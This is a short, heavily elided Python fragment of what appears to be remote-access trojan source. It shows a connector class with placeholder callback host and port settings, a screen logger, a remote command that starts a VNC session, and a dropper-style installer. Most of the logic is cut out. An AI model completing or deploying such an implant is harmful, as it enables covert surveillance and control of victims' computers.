...
class fso_connector(object):
    ...
    def __init__(self):
        ...
        self.RHOST         = "RHOST_TEMPLATE"
        self.RPORT         = RPORT_TEMPLATE
        self.sleepTime     = 10
        self.vnc_on        = False
        ...
        self._fso_vnc      = fso_vnc(self._screenlogger.dest)
            ...
            if command_raw == "ping":
                ...
                if rc_arg1 == "start":
                    if self.vnc_on is False:
                        self._thd_vnc = threading.Thread(target=_fso_vnc.Start)
                        self._thd_vnc.start()
                        self.vnc_on = True
                    else:
...
_fsorifice_installer = fso_installer("DROPNAME_TEMPLATE")
